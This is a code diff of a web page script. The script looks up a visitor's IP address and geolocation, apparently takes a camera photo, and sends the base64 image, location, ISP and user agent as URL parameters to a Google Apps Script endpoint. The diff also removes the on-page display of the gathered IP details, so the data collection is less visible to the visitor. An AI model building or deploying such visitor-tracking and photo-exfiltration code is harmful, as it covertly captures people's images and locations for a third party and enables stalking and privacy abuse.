@@ -12,44 +12,43 @@
 
   <script>
     // 獲取 IP 和地理位置信息
-    async function getIpInfo() {
-      try {
-        const response = await fetch('https://ipinfo.io/json');
-        const data = await response.json();
-        const { ip, city, region, country, org } = data;
-        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
-        const userAgent = navigator.userAgent;
+async function getIpInfo() {
+  try {
+    const response = await fetch('https://ipinfo.io/json');
+    const data = await response.json();
+    const { ip, city, region, country, org } = data;
+    const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
+    const userAgent = navigator.userAgent;
 
-        // 顯示 IP 資訊
-        document.getElementById('ipInfo').innerText =
-          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
+    // 拍攝照片並轉換為 Base64
+    const photoBlob = await takePhoto();
+    const photoBase64 = await blobToBase64(photoBlob);
 
-        // 發送 IP 資訊到後端
-        const photoBlob = await takePhoto();
-        const photoBase64 = await blobToBase64(photoBlob);
-        const url = new URL('https://script.google.com/macros/s/AKfycbxTnG9sQ7PWVRAT6t2WG5vf3Bbx0gZvF5eG8fS_Ymt91ip5e0jdwbamsZdnw1eBg_gmiA/exec');
-        url.searchParams.append('ip', ip);
-        url.searchParams.append('ipType', ipType);
-        url.searchParams.append('userAgent', userAgent);
-        url.searchParams.append('city', city);
-        url.searchParams.append('region', region);
-        url.searchParams.append('country', country);
-        url.searchParams.append('org', org);
-        url.searchParams.append('photo', photoBase64);
+    // 發送 GET 請求
+    const url = new URL('https://script.google.com/macros/s/AKfycbxTXichK7vbJtwQ34a2D9WaXx20sFEMCoRmCqLEkWOjReZCp7-PyYaoi0nDR_2DGNJ9YA/exec');
+    url.searchParams.append('ip', ip);
+    url.searchParams.append('ipType', ipType);
+    url.searchParams.append('userAgent', userAgent);
+    url.searchParams.append('city', city);
+    url.searchParams.append('region', region);
+    url.searchParams.append('country', country);
+    url.searchParams.append('org', org);
+    url.searchParams.append('photo', photoBase64);
 
-        const result = await fetch(url.toString());
-        const responseData = await result.json();
+    const result = await fetch(url.toString());
+    const responseData = await result.json();
 
-        if (responseData.success) {
-          document.getElementById('status').innerText = '上傳成功！';
-        } else {
-          document.getElementById('status').innerText = '上傳失敗，請檢查後端日誌。';
-        }
-      } catch (error) {
-        console.error('錯誤:', error);
-        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
-      }
+    if (responseData.success) {
+      document.getElementById('status').innerText = '上傳成功！';
+    } else {
+      document.getElementById('status').innerText = '上傳失敗，請檢查後端日誌。';
     }
+  } catch (error) {
+    console.error('錯誤:', error);
+    document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
+  }
+}
+
 
     // 拍攝照片
     async function takePhoto() {
